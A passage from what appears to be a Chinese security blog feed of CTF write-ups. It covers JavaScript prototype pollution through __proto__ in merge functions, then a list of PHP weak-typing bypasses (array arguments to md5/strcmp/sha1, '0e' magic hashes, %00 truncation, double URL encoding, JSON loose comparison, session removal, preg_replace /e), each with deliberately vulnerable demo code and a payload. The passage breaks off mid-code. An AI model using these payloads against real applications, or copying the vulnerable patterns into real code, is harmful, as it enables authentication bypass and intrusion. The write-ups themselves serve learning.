class="hljs-string">console.log(&#x27;app</span> <span class="hljs-string">listening</span> <span class="hljs-string">on</span> <span class="hljs-string">port</span> <span class="hljs-number">3000</span><span class="hljs-type">!&#x27;)</span>&#125;<span class="hljs-string">)</span></code></pre><p>获取flag的条件：<code>user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken</code>，源码并没有给user.admintoken赋值。但是在api这个接口的地方，是可以接收data，row，col所以此时我们可以进行原型链污染</p><pre><code class="hljs markdown">matrix[<span class="hljs-string">client.row</span>][<span class="hljs-symbol">client.col</span>] = client.data</code></pre><p>client.row设置为<code>__proto__</code>即可，再将col设为admintoken，此时data就是我们设置的值了。</p><p>此时在admin路由处传入querytoken</p><p><img src="/2021/04/18/js/4.jpg" alt="4"></p><h4 id="demo3"><a class="header-anchor" href="#demo3">🍭</a>demo3</h4><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;            merge(a[attr], b[attr]);        &#125; <span class="hljs-keyword">else</span> &#123;            a[attr] = b[attr];        &#125;    &#125;    <span class="hljs-keyword">return</span> a&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);&#125;<span class="hljs-comment">// Constants</span><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;<span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;<span class="hljs-keyword">const</span> admin = &#123;&#125;;<span class="hljs-comment">// App</span><span class="hljs-keyword">const</span> app = express();app.use(bodyParser.json())app.use(cookieParser());app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));    <span class="hljs-keyword">var</span> copybody = clone(body)    <span class="hljs-keyword">if</span> (copybody.name) &#123;        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span>        &#125;);    &#125; <span class="hljs-keyword">else</span> &#123;        res.json(&#123;            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span>        &#125;)    &#125;&#125;);app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">var</span> аdmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))    <span class="hljs-keyword">if</span> (admin.аdmin == <span class="hljs-number">1</span>) &#123;        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);    &#125;&#125;);app.listen(PORT, HOST);<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);</code></pre><p>获取flag的条件是<code>admin.аdmin == 1</code>而admin 本身是一个object，其admin 属性本身并不存在。还用到了merge 函数进行对象的合并，且涉及到了对象的赋值，键值可控，可以触发原形链污染。</p><p>但本题中我们不能直接将1赋给admin，因为在创建字典的时候，<code>__proto__</code>,不是作为一个键名，而是已经作为<code>__proto__</code>给其父类进行赋值了，所以在<code>test.__proto__</code>中才有admin属性，但我们想让<code>__proto__</code>作为一个键值，此时需要用到JSON.parse。JSON.parse 会把一个json字符串 转化为 javascript的object</p><p><img src="/2021/04/18/js/5.jpg" alt="5"></p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>原型链污染的一个关键点是merge函数，利用点通常都是给未赋值但可赋值的变量进行赋值。</p><p>参考：<a href="https://blog.csdn.net/weixin_45551083/article/details/109589386">原型链污染漏洞(一)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">深入理解 JavaScript Prototype 污染攻击</a></p><p><a href="https://www.anquanke.com/post/id/176884/#h3-5">JavaScript 原型链污染 </a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP弱类型及绕过</title>
    <link href="/2021/04/17/lowtype/"/>
    <url>/2021/04/17/lowtype/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">🍭</a>前言</h2><p>PHP弱类型应用挺多的，来总结一下。</p><p>比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p><h2 id="extract变量覆盖"><a class="header-anchor" href="#extract变量覆盖">🍭</a>extract变量覆盖</h2><blockquote><p><code>extract()</code> 函数</p><blockquote><p>使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖。</p></blockquote></blockquote><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">&#x27;xxx&#x27;</span>;extract($_GET);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan)) &#123;$content=trim(file_get_contents($flag));<span class="hljs-keyword">if</span>($shiyan==$content) &#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()函数将GET方式获得的变量导入到当前的符号表中,然后判断<em>flag</em>和shiyan两个变量的内容是否相等。</p><pre><code class="hljs dts"><span class="hljs-symbol">Payload:</span>?flag=<span class="hljs-variable">&amp;shiyan</span>=</code></pre><p>flag和shiyan这两个变量的内容都会被设置成空字符串。这样,就满足shiyan==content的条件，得到flag。</p><h2 id="strcmp比较字符串"><a class="header-anchor" href="#strcmp比较字符串">🍭</a>strcmp比较字符串</h2><blockquote><p>strcmp()</p><blockquote><p><code>strcmp(string1,string2)</code></p><blockquote><p>比较大小，若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2（区分大小写）</p></blockquote></blockquote></blockquote><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">&#x27;a&#x27;</span>], $flag) == <span class="hljs-number">0</span>)     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag);     <span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。所以strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><pre><code class="hljs php">Payload:?a[]=<span class="hljs-number">123</span></code></pre><h2 id="urldecode二次编码绕过"><a class="header-anchor" href="#urldecode二次编码绕过">🍭</a>urldecode二次编码绕过</h2><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,$_GET[id])) &#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not allowed!&quot;</span>);<span class="hljs-keyword">exit</span>();&#125;$_GET[id] = urldecode($_GET[id]);<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">&quot;hackerDJ&quot;</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access granted!&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><pre><code class="hljs php">Payload: ?id=%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">42</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">41</span></code></pre><h2 id="md5-函数"><a class="header-anchor" href="#md5-函数">🍭</a>md5()函数</h2><table><thead><tr><th>md5()</th><th>函数计算字符串的 MD5 散列</th></tr></thead><tbody><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;username&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;password&#x27;</span>])      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Your password can not be your username.&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]) === md5($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]))      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag);    <span class="hljs-keyword">else</span>      <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><pre><code class="hljs php">Payload:?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre><h2 id="md5加密相等绕过"><a class="header-anchor" href="#md5加密相等绕过">🍭</a>md5加密相等绕过</h2><p>demo：</p><pre><code class="hljs c">&lt;?php$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];$md52 = @md5($a);<span class="hljs-keyword">if</span>(isset($a)) &#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;echo <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;echo <span class="hljs-string">&quot;false!!!&quot;</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;echo <span class="hljs-string">&quot;please input a&quot;</span>;&#125;?&gt;</code></pre><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0，我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><pre><code class="hljs php">Payload: ?a=s878926199a</code></pre><h2 id="数组返回NULL绕过"><a class="header-anchor" href="#数组返回NULL绕过">🍭</a>数组返回NULL绕过</h2><p>demo:</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, $_GET[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You password must be alphanumeric&#x27;</span>;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;--&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . $flag);    <span class="hljs-keyword">else</span>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><blockquote><p>ereg()</p><blockquote><p>搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</p></blockquote></blockquote><blockquote><p>strops()</p><blockquote><p>查找字符串在另一字符串中第一次出现的位置。</p></blockquote></blockquote><p>ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，也就是密码被限制在这三种字符中</p><h4 id="法一："><a class="header-anchor" href="#法一：">🍭</a>法一：</h4><p><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，我们可以绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><pre><code class="hljs php">Payload: ?password[]=<span class="hljs-number">1</span></code></pre><h4 id="法二："><a class="header-anchor" href="#法二：">🍭</a>法二：</h4><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>--</code></pre><h2 id="弱类型整数大小比较绕过"><a class="header-anchor" href="#弱类型整数大小比较绕过">🍭</a>弱类型整数大小比较绕过</h2><p>demo：</p><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>) &#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL即可绕过。</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">2000</span>a</code></pre><h2 id="sha-函数比较绕过"><a class="header-anchor" href="#sha-函数比较绕过">🍭</a>sha()函数比较绕过</h2><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;var_dump($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>;var_dump($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]);var_dump(sha1($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]));var_dump(sha1($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]));<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&#x27;name&#x27;</span>] == $_GET[<span class="hljs-string">&#x27;password&#x27;</span>])<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="hljs-string">&#x27;password&#x27;</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag); <span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;&#125; <span class="hljs-keyword">else</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</p><pre><code class="hljs php">Payload: ?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre><h2 id="十六进制与数字比较"><a class="header-anchor" href="#十六进制与数字比较">🍭</a>十六进制与数字比较</h2><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span>(<span class="hljs-params">$temp</span>) </span>&#123;$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;$one = ord(<span class="hljs-string">&#x27;1&#x27;</span>);<span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$nine = ord(<span class="hljs-string">&#x27;9&#x27;</span>);<span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>$number = <span class="hljs-string">&#x27;3735929054&#x27;</span>;<span class="hljs-comment">// Check all the input characters!</span><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++) &#123;<span class="hljs-comment">// Disallow all the digits!</span>$digit = ord($temp &#123;$i&#125;);<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;<span class="hljs-comment">// Aha, digit not allowed!</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;&#125;&#125;<span class="hljs-keyword">if</span>($number == $temp)<span class="hljs-keyword">return</span> $flag;&#125;$temp = $_GET[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">echo</span> noother_says_correct($temp);<span class="hljs-meta">?&gt;</span></code></pre><p>这题很简单，参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参即可</p><pre><code class="hljs apache"><span class="hljs-attribute">Payload</span>: ?password=<span class="hljs-number">0</span>xdeadc<span class="hljs-number">0</span>de</code></pre><h2 id="10-ereg正则-00截断"><a class="header-anchor" href="#10-ereg正则-00截断">🍭</a>10. ereg正则%00截断</h2><p>demo：</p><pre><code class="hljs c">&lt;?php$flag = <span class="hljs-string">&quot;xxx&quot;</span>;if (isset ($_GET[&#x27;password&#x27;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;echo &#x27;You password must be alphanumeric&#x27;;&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;die(&#x27;Flag: &#x27; . $flag);&#125; <span class="hljs-keyword">else</span> &#123;echo(&#x27;have not been found&#x27;);&#125;&#125; <span class="hljs-keyword">else</span> &#123;echo &#x27;Invalid password&#x27;;&#125;&#125;?&gt;</code></pre><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到&quot;<em>-</em>&quot;才能输出flag。可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*</code></pre><h2 id="数字验证正则绕过"><a class="header-anchor" href="#数字验证正则绕过">🍭</a>数字验证正则绕过</h2><p>demo：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$flag = <span class="hljs-string">&#x27;flag&#123;test&#125;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span> == $_SERVER[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;$password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配 &#123;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#x27;</span>;<span class="hljs-keyword">exit</span>;&#125;<span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>) &#123;$reg = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<span class="hljs-keyword">break</span>;$c = <span class="hljs-number">0</span>;$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt) &#123;<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, $password))$c += <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == $password)               <span class="hljs-keyword">echo</span> $flag;         <span class="hljs-keyword">else</span>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;<span class="hljs-keyword">exit</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>代码中涉及到的一些正则函数</p><blockquote><p>preg_match</p><blockquote><p>执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0  .第一次匹配成功后就停止匹配</p></blockquote></blockquote><blockquote><p>preg_match_all</p><blockquote><p>执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中.  匹配到字符串结束为止</p></blockquote></blockquote><p>下面还有几个正则匹配的字符：</p><table><thead><tr><th>正则匹配字符</th><th>描述</th><th>ASCII</th></tr></thead><tbody><tr><td>[:graph:]</td><td>除空格，TAB外的所有字符</td><td>[\x21-\x7E]</td></tr><tr><td>[a-zA-Z0-9]</td><td>大小写字母和数字</td><td>[a-zA-Z0-9]</td></tr><tr><td>[:alpha:]</td><td>大小写字母</td><td>[a-zA-Z]</td></tr><tr><td>[:punct:]</td><td>任何标点符号</td><td>[!&quot;#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]</td></tr><tr><td>[:digit:]</td><td>任何数字</td><td>[0-9]</td></tr><tr><td>[:upper:]</td><td>任何大写字母</td><td>[A-Z]</td></tr><tr><td>[:lower:]</td><td>任何小写字母</td><td>[a-z]</td></tr></tbody></table><p>题目要求：</p><ul><li>请求方法必须为POST</li><li>正则匹配，[:graph:]为任意字符，要求password长度超过12</li><li>password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过6次</li><li>标点符号，数字，大写字母，小写字母，包含3种以上绕过</li><li>弱类型比较，42abc,强制转换为数字</li></ul><p>构造Payload，居然提示<code>Wrong password</code></p><pre><code class="hljs routeros">Payload: <span class="hljs-attribute">flag</span>=42BugKuctf.a</code></pre><h2 id="md4绕过"><a class="header-anchor" href="#md4绕过">🍭</a>md4绕过</h2><pre><code class="hljs php"><span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">&quot;a&quot;</span>] != hash(<span class="hljs-string">&quot;md4&quot;</span>, $_GET[<span class="hljs-string">&quot;a&quot;</span>])) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Theshy is locked&#x27;</span>);&#125;</code></pre><p>md4可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr></tbody></table><p>Payload：</p><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=0e251288019或?<span class="hljs-attribute">a</span>=0e001233333333333334557778889</code></pre><h2 id="json绕过"><a class="header-anchor" href="#json绕过">🍭</a>json绕过</h2><p>demo：</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;    $message = json_decode($_POST[<span class="hljs-string">&#x27;message&#x27;</span>]);    $key =<span class="hljs-string">&quot;*********&quot;</span>;    <span class="hljs-keyword">if</span> ($message-&gt;key == $key) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==&quot;admin&quot;这种形式绕过。</p><pre><code class="hljs php">Payload: message=&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-number">0</span>&#125;</code></pre><h2 id="SESSION验证绕过"><a class="header-anchor" href="#SESSION验证绕过">🍭</a>SESSION验证绕过</h2><p>在PHP配置中的默认情况下，Session是用Session ID来确定当前对话所对应的服务器Session，sessionID可在cookie中找到，当我们删除cookie中的sessionID后，$_SESSION[‘password’]就会返回空，我们同样传入空的password就能绕过了</p><p>demo：</p><img src="/2021/04/17/lowtype/1.jpg" alt="1" style="zoom:67%;"><p>删掉session值，或者修改session值为一个不存在的session，服务器获取不到session，则password为空，我们再GET一个空的password即可拿到flag</p><h2 id="preg-replace-e-模式下的代码执行"><a class="header-anchor" href="#preg-replace-e-模式下的代码执行">🍭</a>preg_replace /e 模式下的代码执行</h2><blockquote><p>preg_replace<br>函数执行一个正则表达式的搜索和替换</p><blockquote><p><code> mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )</code><br>搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换,$pattern 存在 /e 模式修正符，允许代码执行,/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</p><p>详见:<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p></blockquote></blockquote><h4 id="BJDCTF2020-ZJCTF，不过如此"><a class="header-anchor" href="#BJDCTF2020-ZJCTF，不过如此">🍭</a>[BJDCTF2020]ZJCTF，不过如此</h4><p>根据原页面读取next.php：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$id = $_GET[<span class="hljs-string">&#x27;id&#x27;</span>];$_SESSION[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params">$re, 